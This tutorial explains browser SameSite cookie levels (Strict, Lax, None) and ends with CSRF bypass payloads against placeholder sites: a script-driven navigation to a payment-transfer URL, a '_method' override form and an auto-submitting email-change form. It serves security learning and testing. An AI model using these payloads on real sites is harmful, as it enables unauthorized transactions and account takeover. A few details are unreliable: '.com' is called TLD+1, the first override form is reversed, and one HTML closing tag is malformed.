# Bypassing SameSite cookie restrictions

SameSite is a browser security mechanism that controls when cookies are sent in cross-site requests, providing protection against CSRF, cross-site leaks, and some CORS exploits.

Since 2021, Chrome defaults to Lax SameSite restrictions when websites don't explicitly set their own level. Other major browsers are expected to follow this standard, making it crucial to understand how these restrictions work and can be bypassed for thorough cross-site attack testing.

# 1. The basic

## 1.1 - What is a site

A site is defined as the top-level domain (TLD) plus one additional level (TLD+1), such as `.com` or `.net`. The URL scheme is also considered, so `http://app.example.com` to `https://app.example.com` is treated as cross-site.

## 1.2 - Difference between a site and an origin

**Site vs Origin:** A site encompasses multiple domain names, while an origin includes only one. Two URLs share the same origin if they have identical scheme, domain name, and port.

## 1.3 - How SameSite work

**How does SameSite work?**

SameSite enables browsers and websites to limit which cross-site requests include specific cookies, reducing CSRF attack exposure. Previously, browsers sent cookies in every request to the issuing domain, even from unrelated third-party sites.

**SameSite Levels:**
* `Strict`
* `Lax` 
* `None`

Developers configure restriction levels using the `SameSite` attribute in the `Set-Cookie` header:
`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`

While SameSite provides protection against CSRF attacks, no restriction level offers guaranteed immunity.

**Note:**
> - If the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior. As this is a proposed new standard.

**Strict**
Cookies with `SameSite=Strict` are never sent in cross-site requests—only when the target site matches the browser's address bar. Recommended for sensitive cookies that enable data modification or access to authenticated pages. Most secure option but may impact user experience where cross-site functionality is needed.

**Lax**
Cookies with `SameSite=Lax` are sent in cross-site requests only when both conditions are met:
* Request uses `GET` method
* Request results from top-level user navigation (like clicking links)

Cookies are excluded from cross-site `POST` requests and background requests (scripts, iframes, images), providing protection against common CSRF attack vectors.

**None**
`SameSite=None` disables restrictions entirely—cookies are sent in all requests, including those from unrelated third-party sites. This is the default behavior for most browsers (except Chrome, which defaults to Lax).

Legitimate uses include third-party contexts that don't access sensitive data, like tracking cookies. However, investigate cookies with no restrictions, as some sites disable SameSite on all cookies as a workaround, potentially exposing sensitive ones.

`SameSite=None` requires the `Secure` attribute for HTTPS-only transmission, or browsers will reject the cookie.

`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`

# 2. Bypassing Example

## Bypassing SameSite Lax restrictions using GET requests

Servers often accept both `GET` and `POST` requests to the same endpoint. If session cookies use Lax restrictions, CSRF attacks remain possible via `GET` requests that trigger top-level navigation.

Simple attack example:
```javascript
<script>
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Some frameworks allow method overriding through parameters like `_method`, enabling `POST` endpoints to be accessed via `GET`:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
<input type="hidden" name="_method" value="GET">
<input type="hidden" name="recipient" value="hacker">
<input type="hidden" name="amount" value="1000000">
</form>
```

Other frameworks support a variety of similar parameters.

`GET /my-account/change-email/?email=asd%40asd&_method=POST`

```
<html>
	<body>
		<form method="GET" action="https://something/my-account/change-email/?email=asd%40asd&_method=POST">
			<input type="hidden" name="email" value="asd@asd"/>
			<input type="hidden" name="_method" value="POST"/>
			<input type="submit" value="Submit">
		</form>
    <script>document.forms[0].submit();</script>
	</body>
<html>
```
